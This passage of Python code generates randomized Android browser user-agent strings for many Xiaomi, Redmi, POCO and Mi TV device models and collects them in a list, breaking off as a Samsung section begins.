    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) coc_coc_browser/87.0.320 Mobile Chrome/'
    h=random.randrange(20,103)
    i='0'
    j=random.randrange(4000,5100)
    k=random.randrange(200,350)
    l='Mobile Safari/537.36'
    uakuh=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen2.append(uakuh)

    aa='Mozilla/5.0 (Linux; Android '
    b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
    c=random.choice(['Mi 9T Build/'])
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(80,106)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
    h=random.randrange(20,103)
    i='0'
    j=random.randrange(5600,6700)
    k=random.randrange(200,350)
    l='Mobile Safari/537.36'
    uakuh=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen2.append(uakuh)
   
    aa='Mozilla/5.0 (Linux; Android '
    b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
    c=random.choice(['Mi A2 Build/'])
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(80,106)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
    h=random.randrange(20,103)
    i='0'
    j=random.randrange(5100,6200)
    k=random.randrange(200,350)
    l='Mobile Safari/537.36'
    uakuh=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen2.append(uakuh)
 
    aa='Mozilla/5.0 (Linux; Android '
    b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
    c=random.choice(['MiBOX2 Build/'])
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(80,106)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
    h=random.randrange(20,103)
    i='0'
    j=random.randrange(3200,4300)
    k=random.randrange(200,350)
    l='Mobile Safari/537.36'
    uakuh=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen2.append(uakuh)
 
    aa='Mozilla/5.0 (Linux; Android '
    b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
    c=random.choice(['MIBOX3)'])
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(80,106)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h=random.randrange(20,103)
    i='0'
    j=random.randrange(4400,5500)
    k=random.randrange(200,350)
    l='Mobile Safari/537.36'
    uakuh=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen2.append(uakuh)
 
    aa='Mozilla/5.0 (Linux; Android '
    b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
    c=random.choice(['MiBOX3_PRO)'])
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(80,106)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h=random.randrange(20,103)
    i='0'
    j=random.randrange(3900,5000)
    k=random.randrange(200,350)
    l='Mobile Safari/537.36'
    uakuh=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen2.append(uakuh)

    aa='Mozilla/5.0 (Linux; Android '
    b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
    c=random.choice(['Unsupported MI Cancro)'])
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(80,106)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h=random.randrange(20,103)
    i='0'
    j=random.randrange(4800,5900)
    k=random.randrange(200,350)
    l='Mobile Safari/537.36'
    uakuh=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen2.append(uakuh)
    
    aa='Mozilla/5.0 (Linux; Android '
    b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
    c=random.choice(['Mi CC9 Build/'])
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(80,106)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
    h=random.randrange(20,103)
    i='0'
    j=random.randrange(3400,4500)
    k=random.randrange(200,350)
    l='Mobile Safari/537.36'
    uakuh=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen2.append(uakuh)

    aa='Mozilla/5.0 (Linux; Android '
    b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
    c=random.choice(['MI MAX 3 Build/'])
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(80,106)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) VenusBrowser/3.2.30 Chrome/'
    h=random.randrange(20,103)
    i='0'
    j=random.randrange(5300,6400)
    k=random.randrange(200,350)
    l='Mobile Safari/537.36'
    uakuh=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen2.append(uakuh)
  
    aa='Mozilla/5.0 (Linux; Android '
    b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
    c=random.choice(['MIX Build/'])
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(80,106)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
    h=random.randrange(20,103)
    i='0'
    j=random.randrange(4900,6000)
    k=random.randrange(200,350)
    l='Mobile Safari/537.36'
    uakuh=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen2.append(uakuh)
  
    aa='Mozilla/5.0 (Linux; Android '
    b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
    c=random.choice(['MIX 2 Build/'])
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(80,106)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
    h=random.randrange(20,103)
    i='0'
    j=random.randrange(4800,5900)
    k=random.randrange(200,350)
    l='Mobile Safari/537.36'
    uakuh=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen2.append(uakuh)
    
    aa='Mozilla/5.0 (Linux; Android '
    b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
    c=random.choice(['Mi MIX 2S)'])
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(80,106)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h=random.randrange(20,103)
    i='0'
    j=random.randrange(3900,5000)
    k=random.randrange(200,350)
    l='Mobile Safari/537.36'
    uakuh=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen2.append(uakuh)
    
    aa='Mozilla/5.0 (Linux; Android '
    b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
    c=random.choice(['Mi MIX 3)'])
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(80,106)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) coc_coc_browser/83.0.316 Mobile Chrome/'
    h=random.randrange(20,103)
    i='0'
    j=random.randrange(3800,4900)
    k=random.randrange(200,350)
    l='Mobile Safari/537.36'
    uakuh=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen2.append(uakuh)

    aa='Mozilla/5.0 (Linux; Android '
    b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
    c=random.choice(['Mi MIX 3 5G)'])
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(80,106)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
    h=random.randrange(20,103)
    i='0'
    j=random.randrange(4800,5900)
    k=random.randrange(200,350)
    l='Mobile Safari/537.36'
    uakuh=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen2.append(uakuh)

    aa='Mozilla/5.0 (Linux; Android '
    b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
    c=random.choice(['M2011J18C)'])
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(80,106)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h=random.randrange(20,103)
    i='0'
    j=random.randrange(3800,4900)
    k=random.randrange(200,350)
    l='Mobile Safari/537.36'
    uakuh=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen2.append(uakuh)

    aa='Mozilla/5.0 (Linux; Android '
    b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
    c=random.choice(['Mi MIX2s)'])
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(80,106)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h=random.randrange(20,103)
    i='0'
    j=random.randrange(4200,5200)
    k=random.randrange(200,350)
    l='Mobile Safari/537.36'
    uakuh=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen2.append(uakuh)
    
    aa='Mozilla/5.0 (Linux; Android '
    b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
    c=random.choice(['Mi Note 10 Pro Build/'])
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(80,106)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
    h=random.randrange(20,103)
    i='0'
    j=random.randrange(4600,5700)
    k=random.randrange(200,350)
    l='Mobile Safari/537.36'
    uakuh=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen2.append(uakuh)
 
    aa='Mozilla/5.0 (Linux; Android '
    b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
    c=random.choice(['Mi Pad 4Plus)'])
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(80,106)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h=random.randrange(20,103)
    i='0'
    j=random.randrange(4200,5300)
    k=random.randrange(200,350)
    l='Mobile Safari/537.36'
    uakuh=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen2.append(uakuh)

    aa='Mozilla/5.0 (Linux; Android '
    b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
    c=random.choice(['MI XL)'])
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(80,106)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h=random.randrange(20,103)
    i='0'
    j=random.randrange(4400,5500)
    k=random.randrange(200,350)
    l='Mobile Safari/537.36'
    uakuh=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen2.append(uakuh)
 
    aa='Mozilla/5.0 (Linux; Android '
    b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
    c=random.choice(['Xiaomi Mi5 Build/'])
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(80,106)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h=random.randrange(20,103)
    i='0'
    j=random.randrange(2800,3900)
    k=random.randrange(200,350)
    l='Mobile Safari/537.36'
    uakuh=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen2.append(uakuh)
 
    aa='Mozilla/5.0 (Linux; Android '
    b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
    c=random.choice(['MiTV-AXSO0 Build/'])
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(80,106)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
    h=random.randrange(20,103)
    i='0'
    j=random.randrange(5000,6100)
    k=random.randrange(200,350)
    l='Mobile Safari/537.36'
    uakuh=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen2.append(uakuh)
   
    aa='Mozilla/5.0 (Linux; Android '
    b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
    c=random.choice(['MiTV4I Build/'])
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(80,106)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='MiTV4I Build/PI; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
    h=random.randrange(20,103)
    i='0'
    j=random.randrange(5700,6800)
    k=random.randrange(200,350)
    l='Mobile Safari/537.36'
    uakuh=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen2.append(uakuh)
    
    aa='Mozilla/5.0 (Linux; Android '
    b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
    c=random.choice(['MiTV-MSSP2 Build/'])
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(80,106)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
    h=random.randrange(20,103)
    i='0'
    j=random.randrange(5600,6700)
    k=random.randrange(200,350)
    l='Mobile Safari/537.36'
    uakuh=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen2.append(uakuh)
   
    aa='Mozilla/5.0 (Linux; Android '
    b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
    c=random.choice(['MiTV-MOOQ0)'])
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(80,106)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h=random.randrange(20,103)
    i='0'
    j=random.randrange(3900,5000)
    k=random.randrange(200,350)
    l='Mobile Safari/537.36'
    uakuh=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen2.append(uakuh)
   
    aa='Mozilla/5.0 (Linux; Android '
    b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
    c=random.choice(['MiTV-MOOQ1 Build/'])
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(80,106)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
    h=random.randrange(20,103)
    i='0'
    j=random.randrange(5600,6700)
    k=random.randrange(200,350)
    l='Mobile Safari/537.36'
    uakuh=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen2.append(uakuh)
   
    aa='Mozilla/5.0 (Linux; Android '
    b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
    c=random.choice(['MiTV-MOSR1 Build/'])
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(80,106)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
    h=random.randrange(20,103)
    i='0'
    j=random.randrange(5500,6600)
    k=random.randrange(200,350)
    l='Mobile Safari/537.36'
    uakuh=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen2.append(uakuh)
    
    aa='Mozilla/5.0 (Linux; Android '
    b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
    c=random.choice(['POCOPHONE F1 Build/'])
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(80,106)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
    h=random.randrange(20,103)
    i='0'
    j=random.randrange(5400,6500)
    k=random.randrange(200,350)
    l='Mobile Safari/537.36'
    uakuh=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen2.append(uakuh)
    
    rr = random.randrange
    rc = random.choice
    s = f"Mozilla/5.0 (Linux; Android {str(rr(4,11))}; Redmi K20) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/ {str(rr(73,99))}.0.{str(rr(4600,5700))}.{str(rr(75,150))} Mobile Safari/537.36"
    s1  = f"Mozilla/5.0 (Linux; U; Android {str(rr(4,11))}; Redmi K20) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/ {str(rr(75,150))}.0.{str(rr(4600,5700))}.{str(rr(73,99))} Mobile Safari/537.36"
    s2  = f"Mozilla/5.0 (Linux; Android {str(rr(5,12))}; Redmi K20Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/ {str(rr(75,150))}.0.{str(rr(4100,5200))}.{str(rr(73,99))} Mobile Safari/537.36"
    s3  = f"Mozilla/5.0 (Linux; Android {str(rr(4,11))};  Redmi K30 Build/QKQ1.190825.002) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/ {str(rr(75,150))}.0.{str(rr(3900,5000))}.{str(rr(73,99))} Mobile Safari/537.36"
    s4  = f"Mozilla/5.0 (Linux; Android {str(rr(4,11))}; M2012K11AC Build/TKQ1.220829.002) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/ {str(rr(75,150))}.0.{str(rr(4800,5900))}.{str(rr(73,99))} Mobile Safari/537.36"
    
    uaku2 = str(rc([s,s1,s2,s3,s4]))
    ugen2.append(uaku2)
    
    rr = random.randrange
    rc = random.choice
    m = f"Mozilla/5.0 (Linux; Android {str(rr(4,11))}; Xiaomi Redmi Note 1 Build/N2G48H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/ {str(rr(73,99))}.0.{str(rr(3400,4500))}.{str(rr(75,150))} Mobile Safari/537.36"
    m1  = f"Mozilla/5.0 (Linux; U; Android {str(rr(4,11))}; M2101K7AI) AppleWebKit/537.36 (KHTML, like Gecko) JioPages/3.0.6 Chrome/ {str(rr(75,150))}.0.{str(rr(4300,5400))}.{str(rr(73,99))} Mobile Safari/537.36"
    m2  = f"Mozilla/5.0 (Linux; Android {str(rr(5,12))}; M2101K6I Build/TKQ1.221013.002) AppleWebKit/537.36 (KHTML, like Gecko) VenusBrowser/3.2.42 Chrome/ {str(rr(75,150))}.0.{str(rr(5300,6400))}.{str(rr(73,99))} Mobile Safari/537.36"
    m3  = f"Mozilla/5.0 (Linux; Android {str(rr(4,11))};  2201117TG Build/TKQ1.221114.001) AppleWebKit/537.36 (KHTML, like Gecko) VenusBrowser/4.0.13 Chrome/ {str(rr(75,150))}.0.{str(rr(5700,6800))}.{str(rr(73,99))} Mobile Safari/537.36"
    m4  = f"Mozilla/5.0 (Linux; Android {str(rr(4,11))}; 22111317I) AppleWebKit/537.36 (KHTML, like Gecko) JioPages/4.0.2 Chrome/ {str(rr(75,150))}.0.{str(rr(4900,6000))}.{str(rr(73,99))} Mobile Safari/537.36"
    
    uaku2 = str(rc([m,m1,m2,m3,m4]))
    ugen2.append(uaku2)
     
    
for x in range(10):
    a='Mozilla/5.0 (SAMSUNG; SAMSUNG-GT-S'
    b=random.randrange(100, 9999)
    c=random.randrange(100, 9999)
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
